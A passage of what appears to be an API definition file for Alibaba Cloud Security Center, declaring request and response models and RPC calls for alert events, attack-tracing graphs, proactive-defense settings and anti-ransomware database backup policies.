      eventStatus?: int32(name='EventStatus', description='The status of the alert event. Valid values:

*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
*   **8**: marked as a false positive
*   **16**: handling
*   **32**: handled
*   **64**: expired', example='1'),
      eventSubType?: string(name='EventSubType', description='The subtype of the alert event.', example='login_common_location'),
      hasTraceInfo?: boolean(name='HasTraceInfo', description='Indicates whether the alert event has tracing information. Valid values:

*   **true**
*   **false**', example='true'),
      id?: long(name='Id', description='The unique ID of the alert event.', example='1000'),
      imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='70489fb520cea585ad9761d5a842****'),
      instanceId?: string(name='InstanceId', description='The ID of the affected asset.', example='i-9dp6dwsxdl9z5u1e2f****'),
      instanceName?: string(name='InstanceName', description='The name of the associated instance.', example='nginx'),
      internetIp?: string(name='InternetIp', description='The public IP address of the associated instance.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the associated instance.', example='100.100.XX.XX'),
      k8sClusterId?: string(name='K8sClusterId', description='The ID of the Kubernetes cluster.', example='c517b37e1401e4961b3951863a49a****'),
      k8sClusterName?: string(name='K8sClusterName', description='The name of the Kubernetes cluster.', example='k8s-daily'),
      k8sNamespace?: string(name='K8sNamespace', description='The namespace of the Kubernetes cluster.', example='default'),
      k8sNodeId?: string(name='K8sNodeId', description='The ID of the Kubernetes node.', example='i-bp14a1ay8e0aa9t0****'),
      k8sNodeName?: string(name='K8sNodeName', description='The name of the Kubernetes node.', example='N/A'),
      k8sPodName?: string(name='K8sPodName', description='The name of the Kubernetes pod.', example='myapp-pod'),
      largeModel?: boolean(name='LargeModel'),
      lastTime?: string(name='LastTime', description='The time when the alert event was last detected.', example='2018-09-26 01:51:01'),
      lastTimeStamp?: long(name='LastTimeStamp', description='The timestamp when the alert event was last detected. Unit: milliseconds.', example='1631699497000'),
      level?: string(name='Level', description='The severity of the alert event. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
      maliciousRuleStatus?: string(name='MaliciousRuleStatus', description='The status of the malicious behavior defense rule. Valid values:

*   **open**: enabled.
*   **close**: disabled.', example='open'),
      markMisRules?: string(name='MarkMisRules', description='The advanced whitelist rule.', example='[{\\"uuid\\":\\"ALL\\",\\"field\\":\\"gmtModified\\",\\"operate\\":\\"contains\\",\\"fieldValue\\":\\"222\\"}]'),
      name?: string(name='Name', description='The complete name of the alert event.', example='Unusual Logon-Login with unusual location'),
      occurrenceTime?: string(name='OccurrenceTime', description='The time when the alert event was first detected.', example='2018-09-26 01:51:01'),
      occurrenceTimeStamp?: long(name='OccurrenceTimeStamp', description='The timestamp when the alert event was first detected. Unit: milliseconds.', example='1631699497000'),
      operateErrorCode?: string(name='OperateErrorCode', description='The handling result code of the alert event.', example='kill_and_quara.Success'),
      operateMsg?: string(name='OperateMsg', description='The handing result message of the alert event.', example='success'),
      operateTime?: long(name='OperateTime', description='The handling timestamp of the alert event. Unit: milliseconds.', example='1631699497000'),
      saleVersion?: string(name='SaleVersion', description='The edition of Security Center in which the alert event can be detected. Valid values:

*   **0**: Basic edition
*   **1**: Enterprise edition', example='1'),
      securityEventIds?: string(name='SecurityEventIds', description='The IDs of the associated alert events.', example='270789'),
      stages?: string(name='Stages', description='The stage at which the attack is detected.', example='"["authority_maintenance"]"'),
      tacticItems?: [ 
        {
          tacticDisplayName?: string(name='TacticDisplayName', description='The ATT\\&CK tactic name.', example='Malicious scripts-Malicious script code execution'),
          tacticId?: string(name='TacticId', description='The ATT\\&CK stage information.', example='TA0001'),
        }
      ](name='TacticItems', description='The display name of the attack stage.'),
      uniqueInfo?: string(name='UniqueInfo', description='The unique key of the alert.', example='e17e****'),
      uuid?: string(name='Uuid', description='The unique ID of the associated instance.', example='bf6b30d3-eea8-4924-9f0a-****'),
      clusterId?: string(name='clusterId', description='The ID of the cluster.', example='c2051775877374cccbf68af596e6****'),
    }
  ](name='SuspEvents', description='The information about the alert event.'),
  totalCount?: int32(name='TotalCount', description='The total number of alert events.', example='100'),
}

model DescribeSuspEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventsResponseBody(name='body'),
}

async function describeSuspEvents(request: DescribeSuspEventsRequest): DescribeSuspEventsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSuspEvents', 'POST', '/', 'json', true, 'form', request);
}

model DescribeSuspiciousOverallConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='39.161.XX.XX', position='Query'),
  type: string(name='Type', description='The type of the feature. Valid values:

*   **auto_breaking**: Anti-Virus
*   **ransomware_breaking**: Anti-ransomware (Bait Capture)
*   **webshell\\_cloud_breaking**: Webshell Protection
*   **alinet**: Behavior prevention
*   **k8s\\_log_analysis**: K8s Threat Detection
*   **alisecguard**: Defense mode for Client Protection', example='auto_breaking', position='Query'),
}

model DescribeSuspiciousOverallConfigResponseBody = {
  overallConfig?: {
    config?: string(name='Config', description='The status of the feature. Valid values:

*   **off**: disabled
*   **on**: enabled', example='on'),
    type?: string(name='Type', description='The type of the feature. Valid values:

*   **auto_breaking**: Anti-Virus
*   **ransomware_breaking**: Anti-ransomware (Bait Capture)
*   **webshell\\_cloud_breaking**: Webshell Protection
*   **alinet**: Behavior prevention
*   **k8s\\_log_analysis**: K8s Threat Detection
*   **alisecguard**: Defense mode for Client Protection', example='auto_breaking'),
  }(name='OverallConfig', description='The configuration.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model DescribeSuspiciousOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspiciousOverallConfigResponseBody(name='body'),
}

async function describeSuspiciousOverallConfig(request: DescribeSuspiciousOverallConfigRequest): DescribeSuspiciousOverallConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSuspiciousOverallConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSuspiciousUUIDConfigRequest {
  type: string(name='Type', description='The type of proactive defense. Valid values:

*   **auto_breaking**: virus defense
*   **ransomware_breaking**: ransomware capture
*   **webshell\\_cloud_breaking**: webshell defense
*   **alinet**: malicious behavior defense
*   **alisecguard**: client protection', example='alinet', position='Query'),
}

model DescribeSuspiciousUUIDConfigResponseBody = {
  count?: int32(name='Count', description='The total number of servers on which proactive defense of the specified type takes effect.', example='2'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6044DC07-86F1-5DDA-A611-EC578EA4EEE6'),
  UUIDList?: [ string ](name='UUIDList', description='The UUIDs of servers on which proactive defense of the specified type takes effect.'),
}

model DescribeSuspiciousUUIDConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspiciousUUIDConfigResponseBody(name='body'),
}

async function describeSuspiciousUUIDConfig(request: DescribeSuspiciousUUIDConfigRequest): DescribeSuspiciousUUIDConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSuspiciousUUIDConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribeTargetRequest {
  config?: string(name='Config', description='The type of the vulnerability. Valid values:

*   **cms**: Web CMS vulnerability
*   **sys**: Windows system vulnerability
*   **cve**: Linux software vulnerability
*   **emg**: urgent vulnerability', example='{"vulType":"cms"}', position='Query'),
  type?: string(name='Type', description='The type of the query. Set the value to vul.', example='vul', position='Query'),
}

model DescribeTargetResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  targets?: [ 
    {
      flag?: string(name='Flag', description='The flag that is added to the server. This parameter can be empty.', example='del'),
      target?: string(name='Target', description='The UUID of the server or the ID of the server group.', example='5c5f0169-3527-40a2-b5ff-0bc1db8f****'),
      targetType?: string(name='TargetType', description='The type of the object. Valid values:

*   **uuid**: a server
*   **groupId**: a server group', example='uuid'),
    }
  ](name='Targets', description='The information about the server.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='10'),
}

model DescribeTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTargetResponseBody(name='body'),
}

async function describeTarget(request: DescribeTargetRequest): DescribeTargetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeTarget', 'POST', '/', 'json', false, 'json', request);
}

model DescribeTaskErrorLogRequest {
  buildTaskId: string(name='BuildTaskId', description='The ID of the task.

>  You can call the DescribeImageFixTask operation to query the IDs of tasks.', example='ivf-6e520160-205d-4801-b8e9-9e7e****', position='Query'),
}

model DescribeTaskErrorLogResponseBody = {
  logs?: [ 
    {
      text?: string(name='Text', description='The text content of the log.', example='mv: cannot move \\"CentOS-Base.repo\\" to \\"CentOS-Base.repo.backup\\": Permission denied'),
    }
  ](name='Logs', description='An array that consists of the error logs.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='F929E952-EBFC-56C3-BD35-BF8B59024C69'),
}

model DescribeTaskErrorLogResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTaskErrorLogResponseBody(name='body'),
}

async function describeTaskErrorLog(request: DescribeTaskErrorLogRequest): DescribeTaskErrorLogResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeTaskErrorLog', 'POST', '/', 'json', false, 'json', request);
}

model DescribeTotalStatisticsRequest {
  from?: string(name='From', description='The source of data. Default value: **aqs**. Valid values:

*   **sas**: Security Center
*   **aqs**: Server Guard', example='sas', position='Query'),
  groupId?: long(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](~~130972~~) operation to query the IDs of asset groups.', example='8076980', position='Query'),
  remark?: string(name='Remark', description='The name or public IP address of the asset.', example='222.185.XX.XX', position='Query'),
}

model DescribeTotalStatisticsResponseBody = {
  account?: int32(name='Account', description='The number of logons to the asset.', example='0'),
  health?: int32(name='Health', description='The total number of unfixed baseline risks.', example='0'),
  healthTotal?: int32(name='HealthTotal', description='The total number of baseline risks.', example='0'),
  healthdealedTotal?: int32(name='HealthdealedTotal', description='The total number of fixed baseline risk items. This parameter is deprecated.', example='0'),
  healthhighTotal?: int32(name='HealthhighTotal', description='The number of baseline risk items whose severity is high.', example='0'),
  healthlowTotal?: int32(name='HealthlowTotal', description='The number of baseline risk items whose severity is low.', example='0'),
  healthmediumTotal?: int32(name='HealthmediumTotal', description='The number of baseline risk items whose severity is medium.', example='0'),
  healthseriousTotal?: int32(name='HealthseriousTotal', description='The number of baseline risk items whose severity is urgent. This parameter is deprecated.', example='0'),
  newsuspicious?: int32(name='Newsuspicious', description='The number of alerts that are generated by Server Guard or Security Center.

> 

> *   If you set the **Type** parameter to **sas**, this parameter indicates the number of alerts that are generated by Security Center.

> *   If you set the **Type** parameter to **aqs**, this parameter indicates the number of alerts that are generated by Server Guard.', example='0'),
  online?: boolean(name='Online', description='Indicates whether the agent is online. Valid values:

*   **true**
*   **false**', example='true'),
  patch?: int32(name='Patch', description='The number of Web-CMS vulnerabilities.', example='0'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
  suspicious?: int32(name='Suspicious', description='The number of alerts that are generated by Server Guard.', example='0'),
  suspiciousTotal?: int32(name='SuspiciousTotal', description='This parameter is deprecated.', example='0'),
  suspiciousdealedTotal?: int32(name='SuspiciousdealedTotal', description='The number of handled alerts.', example='0'),
  suspicioushighTotal?: int32(name='SuspicioushighTotal', description='This parameter is deprecated. This parameter is deprecated.', example='0'),
  suspiciouslowTotal?: int32(name='SuspiciouslowTotal', description='The number of alerts whose risk level is reminder.', example='0'),
  suspiciousmediumTotal?: int32(name='SuspiciousmediumTotal', description='The number of alerts whose risk level is suspicious.', example='28'),
  suspiciousseriousTotal?: int32(name='SuspiciousseriousTotal', description='The number of alerts whose risk level is urgent.', example='0'),
  trojan?: int32(name='Trojan', description='The number of webshell alerts.', example='0'),
  vul?: int32(name='Vul', description='The number of unfixed vulnerabilities.', example='0'),
  vulAsapSum?: int32(name='VulAsapSum', description='The number of vulnerabilities whose severity level is high.', example='16'),
  vulDealedTotal?: int32(name='VulDealedTotal', description='The total number of fixed vulnerabilities.', example='0'),
  vulLaterSum?: int32(name='VulLaterSum', description='The number of vulnerabilities whose severity level is medium.', example='0'),
  vulNntfSum?: int32(name='VulNntfSum', description='The number of unfixed vulnerabilities whose severity level is low.', example='0'),
  vulTotal?: int32(name='VulTotal', description='The total number of vulnerabilities.', example='0'),
}

model DescribeTotalStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTotalStatisticsResponseBody(name='body'),
}

async function describeTotalStatistics(request: DescribeTotalStatisticsRequest): DescribeTotalStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeTotalStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeTraceInfoDetailRequest {
  from: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas', position='Query'),
  incidentTime?: long(name='IncidentTime', description='The timestamp of the detection. Unit: milliseconds.', example='1670555392000', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. The value of this parameter is specified by the system.', example='127.0.0.1', position='Query'),
  type: string(name='Type', description='The type of the vertex. Set the value to **SAS_INCIDENT**.', example='SAS_INCIDENT', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server.', example='1627f2d7-aaa2-4ed1-b07a-xxxxxxxxxxxxxx', position='Query'),
  vertexId: string(name='VertexId', description='The ID of the vertex. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the ID.', example='cce1d28dxxxxxxxxxxxxxxxx', position='Query'),
}

model DescribeTraceInfoDetailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='24A20733-10A0-4AF6-BE6B-XXXXXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  traceInfoDetail?: {
    edgeList?: [ 
      {
        count?: int32(name='Count', description='The number of times.', example='1'),
        endId?: string(name='EndId', description='The ending vertex ID of the edge of the tracing diagram.', example='a1d1fa39e5345dcef3f9712172cxxxxx'),
        startId?: string(name='StartId', description='The starting vertex ID of the edge of the tracing diagram.', example='02b4bf933c8e3bb8b9465eee502xxxxx'),
        time?: string(name='Time', description='The point in time.', example='2022-12-21 10:24:42'),
        type?: string(name='Type', description='The type of the edge of the tracing diagram.', example='trigger_file_alert'),
      }
    ](name='EdgeList', description='An array that consists of the edges of the tracing diagram.'),
    entityTypeList?: [ 
      {
        dbId?: int32(name='DbId', description='This parameter is deprecated.', example='Deprecated'),
        displayColor?: string(name='DisplayColor', description='The rendering color of the vertex.', example='#fff'),
        displayIcon?: string(name='DisplayIcon', description='The icon style of the vertex.', example='https://img.alicdn.com/tfs/TB176P5OgDqK1RjSZSyXXaxEVXa-49-48.png'),
        displayTemplate?: string(name='DisplayTemplate', description='This parameter is deprecated.', example='[{"name":"${logtime}","value":"$!{time}"}]'),
        gmtCreate?: long(name='GmtCreate', description='The timestamp when the vertex was created.', example='2022-10-09T11:47Z'),
        gmtModified?: long(name='GmtModified', description='The time when the vertex was last modified.', example='2022-10-09T11:47Z'),
        id?: string(name='Id', description='The ID of the vertex type.', example='Alert'),
        limit?: int32(name='Limit', description='This parameter is deprecated.', example='Deprecated'),
        name?: string(name='Name', description='The name of the vertex type.', example='Alert'),
        namespace?: string(name='Namespace', description='The namespace.', example='*'),
        offset?: int32(name='Offset', description='This parameter is deprecated.', example='Deprecated'),
      }
    ](name='EntityTypeList', description='An array that consists of the metadata configurations of the vertex type.'),
    relationTypeList?: [ 
      {
        directed?: int32(name='Directed', description='Indicates whether the edge is a directional edge. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
        displayColor?: string(name='DisplayColor', description='The rendering color of the edge.', example='#fff'),
        name?: string(name='Name', description='The name of the edge type.', example='file'),
        relationTypeId?: string(name='RelationTypeId', description='The ID of the edge type.', example='netflow_to_process'),
        showType?: string(name='ShowType', description='This parameter is deprecated.', example='Deprecated'),
      }
    ](name='RelationTypeList', description='An array that consists of the metadata configurations of the edge type.'),
    vertexList?: [ 
      {
        count?: int32(name='Count', description='The number of times.', example='1'),
        id?: string(name='Id', description='The ID of the vertex.', example='a1d1fa39e5345dcef3f9712172xxxxxx'),
        name?: string(name='Name', description='The name of the entity represented by the vertex.', example='/usr/local/tomcat'),
        neighborList?: [ 
          {
            count?: int32(name='Count', description='The number of neighbor nodes.', example='1'),
            hasMore?: boolean(name='HasMore', description='Indicates whether one more page is returned.', example='False'),
            type?: string(name='Type', description='The type of the neighbor node. The value is fixed as **alert**.', example='alert'),
          }
        ](name='NeighborList', description='An array that consists of the neighbor nodes.'),
        time?: string(name='Time', description='The point in time.', example='2022-12-21 10:24:42'),
        type?: string(name='Type', description='The type of the entity represented by the vertex.', example='file_path'),
      }
    ](name='VertexList', description='An array that consists of all vertexes of the tracing diagram.'),
  }(name='TraceInfoDetail', description='The details of the tracing diagram.'),
}

model DescribeTraceInfoDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTraceInfoDetailResponseBody(name='body'),
}

async function describeTraceInfoDetail(request: DescribeTraceInfoDetailRequest): DescribeTraceInfoDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeTraceInfoDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribeTraceInfoNodeRequest {
  eventName?: string(name='EventName', description='The name of the alert event.

> You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the names of alerts events.', example='WEBSHELL', position='Query'),
  from: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas', position='Query'),
  incidentTime?: long(name='IncidentTime', description='The time when the alert event was first detected.', example='1635978934000', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. The value of this parameter is specified by the system.', example='127.0.XX.XX', position='Query'),
  type: string(name='Type', description='The type of the vertex. You can call the [DescribeTraceInfoDetail](~~DescribeTraceInfoDetail~~) operation to query the types of vertexes.', example='SAS_ASSET', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the UUIDs of servers.', example='6f346617-eef9-45e6-b6d1-946xxxxxxxx', position='Query'),
  vertexId: string(name='VertexId', description='The ID of the vertex.', example='03da4e2350a3eb50cd25a18cexxxxxxx', position='Query'),
}

model DescribeTraceInfoNodeResponseBody = {
  node?: {
    name?: string(name='Name', description='The name of the node.', example='login'),
    propertyList?: [ 
      {
        name?: string(name='Name', description='The name of the property.', example='Incident'),
        value?: string(name='Value', description='The value of the property.', example='Alert'),
      }
    ](name='PropertyList', description='An array that consists of the properties of the node.'),
    type?: string(name='Type', description='The type of the node.', example='Alert'),
  }(name='Node', description='The details about the node.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='F35F45B0-5D6B-4238-BE02-A62DXXXXXXXX'),
}

model DescribeTraceInfoNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTraceInfoNodeResponseBody(name='body'),
}

async function describeTraceInfoNode(request: DescribeTraceInfoNodeRequest): DescribeTraceInfoNodeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeTraceInfoNode', 'POST', '/', 'json', false, 'json', request);
}

model DescribeUniBackupDatabaseRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **MSSQL**
*   **Oracle**', example='MYSQL', position='Query'),
  instanceName?: string(name='InstanceName', description='The name of the Elastic Compute Service (ECS) instance.', example='test', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  queryType?: string(name='QueryType', description='The condition that is used to query the database. Valid values:

*   **create**: newly created
*   **restore**: restored', example='create', position='Query'),
  uniRegionId?: string(name='UniRegionId', description='The region ID of the server that hosts the database.', example='cn-hongkong', position='Query'),
}

model DescribeUniBackupDatabaseResponseBody = {
  databaseList?: [ 
    {
      agentStatus?: string(name='AgentStatus', description='The status of the anti-ransomware agent. Valid values:

*   **UNKNOWN**: unknown
*   **INSTALLED**: installed
*   **INSTALL_FAILED**: installation failed
*   **UNINSTALL_FAILED**: uninstallation failed', example='INSTALLED'),
      createdByProduct?: string(name='CreatedByProduct', description='The service from which the database is created. Valid values:

*   **HBR**: HBR
*   **AEGIS**: Security Center', example='AEGIS'),
      databaseName?: string(name='DatabaseName', description='The name of the database.', example='apns_tt180'),
      databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **MSSQL**
*   **Oracle**', example='MYSQL'),
      databaseVersion?: string(name='DatabaseVersion', description='The version of the database engine.', example='12.0.4100.1'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp15aho9hhftvmhw****'),
      instanceName?: string(name='InstanceName', description='The name of the instance to which the database belongs.', example='sql-test-001'),
      instanceUuid?: string(name='InstanceUuid', description='The UUID of the Hybrid Backup Recovery (HBR) agent that is used to back up the data of the database.', example='85878b284df911ec800000163e19****'),
      policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.', example='123'),
      status?: string(name='Status', description='The status of the ECS instance. Valid values:

*   **Stopped**
*   **Running**', example='Running'),
    }
  ](name='DatabaseList', description='An array that consists of the information about the databases.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='25'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
}

model DescribeUniBackupDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniBackupDatabaseResponseBody(name='body'),
}

async function describeUniBackupDatabase(request: DescribeUniBackupDatabaseRequest): DescribeUniBackupDatabaseResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeUniBackupDatabase', 'POST', '/', 'json', false, 'json', request);
}

model DescribeUniBackupPoliciesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='auto_oracle_Hpm', position='Query'),
}

model DescribeUniBackupPoliciesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ACF97412-FD09-4D1F-994F-34DF12BR****'),
  uniBackupPolicies?: [ 
    {
      agentErrorMessage?: string(name='AgentErrorMessage', description='The error message for the anti-ransomware agent.', example='INSTALL_TIMEOUT'),
      agentStatus?: string(name='AgentStatus', description='The status of the agent. Valid values:

*   **UNKNOWN**: unknown
*   **INSTALLED**: installed
*   **INSTALL_FAILED**: installation failed
*   **UNINSTALL_FAILED**: uninstallation failed', example='INSTALLED'),
      databaseName?: string(name='DatabaseName', description='The name of the database.', example='abc123'),
      databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **MSSQL**
*   **Oracle**', example='MYSQL'),
      errorCode?: string(name='ErrorCode', description='The error code returned when the backup task fails.', example='EXPIRED'),
      errorMessage?: string(name='ErrorMessage', description='The error message for the anti-ransomware policy.', example='AttachRamRoleError'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-9dp7mubt5wit6g0h****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-001'),
      instanceStatus?: string(name='InstanceStatus', description='The status of the Elastic Compute Service (ECS) instance. Valid values:

*   **Stopped**
*   **Running**', example='Running'),
      instanceUuid?: string(name='InstanceUuid', description='The UUID of the agent that is used to back up the data of the database.', example='cf1bcad4063f11ed800000163e0e****'),
      latestBackResult?: string(name='LatestBackResult', description='The execution result of the last backup task.', example='completed'),
      latestBackupTime?: string(name='LatestBackupTime', description='The time when the last backup task was executed.', example='2022-01-01 00:00:11'),
      planStatus?: string(name='PlanStatus', description='The status of the backup task. Valid values:

*   **init**: initializing
*   **running**: running
*   **completed**: complete
*   **restoring**: restoring
*   **creating**: creating
*   **created**: created', example='creating'),
      policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.', example='123'),
      policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='auto_oracle_37f'),
      policyStatus?: string(name='PolicyStatus', description='The status of the anti-ransomware policy. Valid values:

*   **initiating**: initializing
*   **opening**: enabled
*   **closing**: disabled
*   **deleting**: deleting', example='opening'),
      uniRegionId?: string(name='UniRegionId', description='The region ID of the server that hosts the database.', example='cn-hangzhou'),
    }
  ](name='UniBackupPolicies', description='An array that consists of the anti-ransomware policies.'),
}

model DescribeUniBackupPoliciesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniBackupPoliciesResponseBody(name='body'),
}

async function describeUniBackupPolicies(request: DescribeUniBackupPoliciesRequest): DescribeUniBackupPoliciesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeUniBackupPolicies', 'POST', '/', 'json', false, 'json', request);
}

model DescribeUniBackupPolicyDetailRequest {
  policyId: string(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='123', position='Query'),
}

model DescribeUniBackupPolicyDetailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760****'),
  uniBackupPolicyDTO?: {
    accountName?: string(name='AccountName', description='The name of the database account.', example='admin'),
    agentStatus?: string(name='AgentStatus', description='The status of the database client. Valid values:

*   **UNKNOWN**: unknown
*   **INSTALLED**: installed
*   **INSTALL_FAILED**: installation failed
*   **UNINSTALL_FAILED**: uninstallation failed', example='INSTALLED'),
    databaseType?: string(name='DatabaseType', description='The type of the database. Valid values:

*   **MYSQL**
*   **MSSQL**
*   **Oracle**', example='ORACLE'),
    fullPlan?: {
      days?: [ string ](name='Days', description='An array that consists of the days of a week on which the backup is performed.'),
      interval?: int32(name='Interval', description='The interval of backup tasks.', example='2'),
      planType?: string(name='PlanType', description='The unit of the interval. Valid values:

*   **hourly**: hour
*   **daily**: day
*   **weekly**: week', example='daily'),
      startTime?: string(name='StartTime', description='The time when the full backup started. The time is in the HH:mm:ss format.', example='00:10:00'),
    }(name='FullPlan', description='The details of the policy for full backup.'),
    incPlan?: {
      days?: [ string ](name='Days', description='An array that consists of the days of a week on which the backup is performed.'),
      interval?: int32(name='Interval', description='The interval of backup tasks.', example='2'),
      planType?: string(name='PlanType', description='The unit of the interval. Valid values:

*   **hourly**: hour
*   **daily**: day
*   **weekly**: week', example='daily'),
      startTime?: string(name='StartTime', description='The time when the incremental data backup starts. The time is in the hh:mm:ss format.', example='00:10:00'),
    }(name='IncPlan', description='The policy for incremental data backup.'),
    instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-2zefcy2id5d60m9t****'),
    instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-01'),
    policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.', example='123'),
    policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='auto_test_sql'),
    policyStatus?: string(name='PolicyStatus', description='The status of the anti-ransomware policy. Valid values:

*   **initiating**: initializing
*   **opening**: enabled
*   **closing**: disabled
*   **deleting**: deleting', example='opening'),
    retention?: int32(name='Retention', description='The retention period of the backup snapshot.', example='7'),
    speedLimiter?: long(name='SpeedLimiter', description='The maximum network bandwidth that is allowed during data backup. Unit: bytes.', example='5242880'),
  }(name='UniBackupPolicyDTO', description='The details of the anti-ransomware policy.'),
}

model DescribeUniBackupPolicyDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniBackupPolicyDetailResponseBody(name='body'),
}

async function describeUniBackupPolicyDetail(request: DescribeUniBackupPolicyDetailRequest): DescribeUniBackupPolicyDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeUniBackupPolicyDetail', 'POST', '/', 'json', false, 'json', request);
}

model DescribeUniRecoverableListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
